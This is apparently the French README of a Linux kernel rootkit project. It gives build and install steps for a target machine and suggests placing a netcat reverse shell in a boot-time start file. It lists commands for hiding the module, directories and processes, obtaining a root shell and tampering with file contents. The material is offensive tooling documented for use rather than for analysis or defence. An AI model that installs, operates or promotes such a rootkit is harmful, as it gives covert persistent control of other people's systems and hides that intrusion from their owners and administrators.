# build

- make menuconfig
- choisir ces options
- si machine fixe, make install
- sinon copier les répertoires scripts et outputs vers la machine cible

Enjoy !!!!!


# Installation
Une fois sur la machine cible, exécuter le script installer.sh dans scrits, le rootkit sera installé.
Le fichier start vous permettra de lancer des commandes qui s'exécuteront au démarrage du système, vous pouvez y metrre votre reverse shell netcat
Cependant le traffic ne sera pas caché car cette fonctionnalité n'est pas encore implémenté

# Commandes 

- `/rootkit/rootkit_cmd hide_mod` : cacher le module
- `/rootkit/rootkit_cmd hide` : cacher les dossiers sur la base du nom donné lors du make menuconfig
- `/rootkit/rootkit_cmd show` : montrer les dossiers 
- `/rootkit/rootkit_cmd hide <PID>` : cacher un processus
- `/rootkit/rootkit_cmd show <PID>` : afficher un processus caché
- `/rootkit/rootkit_cmd root` : shell root
- `/rootkit/rootkit_cmd file-tampering` : cacher des parties d'un fichiers en se basant sur un tag
- `/rootkit/rootkit_cmd no_OWD` : Eviter d'ouvrir les fichiers cachés



